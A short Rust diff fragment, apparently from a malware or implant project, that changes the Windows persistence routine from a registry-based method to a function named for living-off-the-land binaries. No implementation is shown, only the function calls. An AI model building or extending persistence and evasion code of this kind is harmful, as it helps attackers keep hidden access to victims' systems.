@@ -14,7 +14,7 @@ mod persistance;
 fn setup_persistence() {
     #[cfg(target_os = "windows")]
     {
-        let _ = persistance::add_to_registry();
+        let _ = persistance::setup_persistence_lolbin();
     }
 
     #[cfg(target_os = "linux")]
